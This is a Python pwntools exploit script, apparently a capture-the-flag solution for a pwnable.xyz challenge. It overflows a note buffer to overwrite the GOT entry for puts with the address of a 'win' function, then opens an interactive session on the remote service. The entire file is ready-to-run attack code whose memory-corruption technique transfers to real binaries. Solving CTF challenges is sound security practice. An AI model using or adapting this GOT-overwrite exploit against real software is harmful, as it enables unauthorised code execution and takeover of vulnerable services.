from pwn import *

def edit_note(length,content):
	sla('>','1')
	sla('?',str(length))
	sa(':',content)

def edit_desc(content):
	sla('>','2')
	sa(':',content)

if __name__ == '__main__':
	e = ELF('./challenge')
	#p = process('./challenge')
	p = remote('svc.pwnable.xyz',30016)
	sla = lambda x,y : p.sendlineafter(x,y)
	sa = lambda x,y : p.sendafter(x,y)

	edit_note(50,"A"*0x20 + p64(e.got['puts']))
	edit_desc(p64(e.symbols['win']))
	p.sendlineafter('>','3')
	p.interactive()